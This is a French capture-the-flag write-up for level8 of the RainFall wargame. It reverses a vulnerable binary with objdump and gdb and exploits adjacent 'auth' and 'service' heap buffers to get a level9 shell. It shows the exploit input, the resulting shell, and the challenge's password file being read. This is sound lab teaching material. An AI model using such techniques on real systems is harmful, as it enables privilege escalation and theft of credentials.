## Démarches

- Avec `objdump -d level8` (ou `disass main` dans gdb) et `strings level8`, on peut décortiquer le fonctionnement du programme.
    ```
    %p, %p
    auth
    reset
    service
    login
    /bin/sh
    Password:
    ```
- Gdb-peda nous permet de connaitre l'adresse de l'appel à un nouveau shell :
    - `find "/bin/sh"`
    ```
    Searching for '/bin/sh' in: None ranges
    Found 3 results, display max 3 items:
    level8 : 0x8048833 ("/bin/sh")
    level8 : 0x8049833 ("/bin/sh")
    libc : 0xb7f8cc58 ("/bin/sh")
    ```
    - `objdump -d level8 | grep "0x8048833"`
        >       80486ee:	c7 04 24 33 88 04 08 	movl   $0x8048833,(%esp)

    - Dans gdb, on peut run le binaire (avec un breakpoint en début de main), et jump directement à l'adresse  de l'appel : `jump *0x80486ee`
    - On obtient bien un shell, reste à trouver comment y parvenir en dehors de gdb

- `objdump -d level8 | grep "cmp"`
    ```
    80485cf:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
    8048656:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
    804868c:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
    80486c9:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
    ```
    Dans gdb-peda, on ajoute un breakpoint pour chacune de ces comparaisons, on peut alors observer que chacune compare la chaine récupérée avec fgets avec :
      
    - `auth `
    - `reset`
    - `service`
    - `login`

- si la chaine commence par `auth `, la longueur du reste de la chaine est aussi comparée à `1e` soit 30, puis copiée dans `auth` si elle remplie les conditions
  >     8048625:	83 f8 1e             	cmp    $0x1e,%eax
  
- si la chaine est `login`, le programme teste si le 32ème (*0x20s*) caractère de `auth` est différent de `\0`
  >     => 0x80486e7 <main+387>:	mov    eax,DWORD PTR [eax+0x20] 
  Si c'est le cas, un nouveau shell est lancé, sinon le programme affiche `Password:`

- Le programme affichant les adresses des variables `auth` et `service`, on peut remarquer qu'elles se suivent sur la stack. On peut donc appeler *auth* (suivi d'un espace) puis remplir *service* d'au moins 32 caractères, et enfin lancer `login` qui accèdera au 32ème caractères de *auth* soit un caractères de la chaine *service* :
```
level8@RainFall:~$ ./level8
    (nil), (nil)
    auth
    0x804a008, (nil)
    service 12345678901234567890123456789012345
    0x804a008, 0x804a018
    login
    $ whoami
    level9
    $ pwd
    /home/user/level8
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    $
```


<br>
----
## Ressources